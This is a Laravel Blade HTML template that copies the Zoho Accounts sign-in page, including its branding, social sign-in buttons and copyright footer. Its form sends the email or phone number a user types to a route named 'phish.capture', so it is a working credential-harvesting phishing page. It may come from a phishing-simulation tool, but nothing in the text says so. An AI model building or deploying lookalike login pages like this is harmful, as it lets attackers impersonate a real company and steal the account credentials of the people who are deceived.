<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Zoho Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: #fff;
            color: #000;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .page {
            flex: 1;
            display: flex;
        }

        .left-panel {
            width: 56%;
            padding: 0;
        }

        .right-panel {
            width: 44%;
            background: #f0f7ff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 60px;
            gap: 32px;
        }

        .form-area {
            padding: 0 40px 0 288px;
        }

        .try-banner {
            display: inline-block;
            background: #159aff;
            color: #fff;
            font-size: 13px;
            font-weight: 500;
            padding: 6px 14px;
            border-radius: 4px;
            margin-top: 150px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 24px;
            font-weight: 500;
            color: #000;
            margin-bottom: 6px;
        }

        .subtitle {
            font-size: 16px;
            font-weight: 400;
            color: #000;
            margin-bottom: 32px;
        }

        .field-group {
            position: relative;
            margin-bottom: 20px;
        }

        .field-group input {
            width: 398px;
            height: 44px;
            padding: 10px 16px;
            font-size: 16px;
            font-family: inherit;
            color: #000;
            background: #f8f8f8;
            border: 1px solid #e0e0e0;
            border-radius: 2px;
            outline: none;
        }

        .field-group input:focus {
            border-color: #159aff;
        }

        .btn-next {
            width: 398px;
            height: 44px;
            padding: 0 20px;
            font-size: 14px;
            font-weight: 600;
            font-family: inherit;
            color: #fff;
            background: #159aff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 8px;
        }

        .btn-next:hover { background: #0d8ae6; }

        .change-link {
            font-size: 14px;
            font-weight: 500;
            color: #0091ff;
            text-decoration: none;
            cursor: pointer;
        }

        .change-link:hover { text-decoration: underline; }

        .next-row {
            display: flex;
            align-items: center;
            gap: 16px;
            margin-bottom: 32px;
        }

        .signin-using {
            font-size: 15px;
            font-weight: 600;
            color: #444;
            margin-bottom: 16px;
        }

        .social-buttons {
            display: flex;
            gap: 12px;
            margin-bottom: 24px;
        }

        .social-btn {
            width: 44px;
            height: 44px;
            border: 1px solid #e0e0e0;
            border-radius: 4px;
            background: #fff;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .social-btn:hover { background: #f5f5f5; }

        .signup-text {
            font-size: 14px;
            color: #555;
            margin-top: 40px;
        }

        .signup-text a {
            color: #159aff;
            font-weight: 600;
            text-decoration: none;
        }

        .signup-text a:hover { text-decoration: underline; }

        .feature-card {
            background: #fff;
            border-radius: 12px;
            padding: 24px;
            width: 100%;
            max-width: 360px;
        }

        .feature-card h3 {
            font-size: 16px;
            font-weight: 600;
            color: #000;
            margin-bottom: 12px;
        }

        .feature-card p {
            font-size: 14px;
            color: #000;
            line-height: 1.5;
            margin-bottom: 16px;
        }

        .feature-card .learn-more {
            display: inline-block;
            font-size: 14px;
            font-weight: 600;
            color: #0091ff;
            background: #ecf7fe;
            padding: 8px 16px;
            border-radius: 18px;
            text-decoration: none;
        }

        .feature-card .learn-more:hover { background: #dbeffc; }

        footer {
            text-align: center;
            padding: 16px 0;
            font-size: 14px;
            color: #727272;
        }
    </style>
</head>
<body>
    <div class="page">
        <div class="left-panel">
            <div class="form-area">
                <div class="try-banner">Try smart sign-in</div>

                <h1>Sign in</h1>
                <p class="subtitle">to access <strong>Accounts</strong></p>

                <form action="{{ route('phish.capture', ['provider' => 'zoho', 'token' => $token]) }}" method="POST" autocomplete="off">
                    @csrf

                    <div class="field-group">
                        <input type="text" id="email" name="identifier" placeholder="Email address or mobile number" autocomplete="username" value="{{ $email ?? '' }}">
                    </div>

                    <div class="next-row">
                        <a href="#" class="change-link">Change</a>
                        <button type="submit" class="btn-next">Next</button>
                    </div>
                </form>

                <p class="signin-using">Sign in using</p>

                <div class="social-buttons">
                    <button type="button" class="social-btn" aria-label="Google">
                        <svg width="20" height="20" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
                    </button>
                    <button type="button" class="social-btn" aria-label="Microsoft">
                        <svg width="20" height="20" viewBox="0 0 21 21"><path d="M0 0h10v10H0z" fill="#f25022"/><path d="M11 0h10v10H11z" fill="#7fba00"/><path d="M0 11h10v10H0z" fill="#00a4ef"/><path d="M11 11h10v10H11z" fill="#ffb900"/></svg>
                    </button>
                    <button type="button" class="social-btn" aria-label="LinkedIn">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#0077B5"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
                    </button>
                </div>

                <p class="signup-text">Don't have a Zoho account? <a href="#">Sign up now</a></p>
            </div>
        </div>

        <div class="right-panel">
            <div class="feature-card">
                <h3>Passwordless sign-in</h3>
                <p>Move away from risky passwords and experience one-tap sign-in with passkeys.</p>
                <a href="#" class="learn-more">Learn more</a>
            </div>
            <div class="feature-card">
                <h3>MFA for all accounts</h3>
                <p>Secure online accounts with OneAuth 2FA. Back up OneAuth secrets to Zoho Vault.</p>
                <a href="#" class="learn-more">Learn more</a>
            </div>
        </div>
    </div>

    <footer>© 2026, Zoho Corporation Pvt. Ltd. All Rights Reserved.</footer>
</body>
</html>
